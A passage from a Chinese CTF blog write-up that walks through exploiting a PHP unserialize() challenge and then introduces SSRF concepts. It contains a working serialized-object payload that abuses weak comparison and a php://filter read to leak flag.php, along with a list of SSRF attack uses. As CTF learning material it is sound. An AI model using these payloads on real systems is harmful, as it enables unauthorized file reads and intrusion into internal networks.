        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span>$s<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>$i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>$s<span class="token punctuation">)</span><span class="token punctuation">;</span> $i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>$s<span class="token punctuation">[</span>$i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span>$s<span class="token punctuation">[</span>$i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">{<!-- --></span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

    $str <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        $obj <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>需要绕过两个地方<br> 1.绕过is_valid(),protected属性<br> 方法：用大写S表示字符串，在php7.1+的环境下对属性的要求不是很敏感,用public属性绕过private属性产生的%00问题</p> 
<p>2.弱类型绕过<br> __destruct()魔术方法中，op==="2"是强比较（类型和属性都等于’2’），而process()使用的是弱比较op==“2”，可以通过弱类型绕过<br> 方法：op=2，这时op==="2"为false,op=="2"为true</p> 
<pre><code>private function read() {
        $res = "";
        if(isset($this-&gt;filename)) {
            $res = file_get_contents($this-&gt;filename);
        }
        return $res;
    }
    ```
对于file_get_contents()函数，可以用php:filter伪协议读取，将filename置为```php://filter/read=convert.base64-encode/resource=flag.php``。
```java
&lt;?php
class FileHandler {
    public $op = 2;
    public $filename = 'php://filter/read=convert.base64-encode/resource=flag.php';//或者直接读'flag.php'
    public $content;
}
echo serialize(new FileHandler);
?&gt;
//O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
</code></pre> 
<p>payload为</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>str<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"FileHandler"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"op"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"content"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/47/6f/hs1tu1MO_o.png" alt="在这里插入图片描述"><br> 得到flag{12ffa359-defc-4dc6-b363-0b6f48c79b91}</p> 
<h3><a id="SSRF_710"></a>SSRF</h3> 
<ul><li>1.介绍SSRF <a href="https://www.jianshu.com/p/d1d1c40f6d4c" rel="nofollow">参考文章</a></li></ul> 
<ol><li> <p>SSRF简介<br> SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。</p> <p>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</p> </li><li> <p>SSRF形成原因<br> 大都是由于服务端提供了从其它服务器获取数据的功能，比如使用户从指定的URL web应用获取图片、下载文件、读取文件内容等。但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。</p> <p>最常见的例子：攻击者传入一个未经验证的URL，后端代码直接请求这个URL，就会造成SSRF漏洞。</p> </li><li> <p>SSRF与CSRF的区别<br> CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器；</p> <p>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</p> </li><li> <p>SSRF的类型<br> 1）显示对攻击者的响应（basic）：在服务器获取攻击者要求的URL后，把响应发送回攻击者。<br> 2）不显示响应（blind）：在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者，需要通过抓包或查看服务器日志判断是否存在服务端请求伪造漏洞。</p> </li><li> <p>利用SSRF可以实现的攻击<br> 1）获取web应用可达服务器的banner信息（如软件开发商、软件名称等），以及收集内网web应用的指纹识别（如开放的端口、中间件版本等），根据这些信息再进行进一步的渗透；<br> 2）攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，对有漏洞的内网web应用实施攻击获取webshell（如Struts2命令执行，discuz!论坛SSRF通过Redis实施getshell等）；<br> 3）利用有脆弱性的组件结合ftp://，file:///，gopher://，dict://等协议实施攻击（如FFmpeg任意文件读取，XXE攻击等）。</p> </li><li> <p>拓展攻击面<br> 结合gopher协议攻击内网FTP、Telnet、Redis、FastCGI、Memcache，也可以进行get、post请求。</p> </li></ol>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0d22fe784eac9271665520bedf9e0dd4/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">ROS中将话题数据保存到txt文档</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a088a1e7af0bcc5afc37901bf2a2e42d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Linux基础入门和文件管理</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>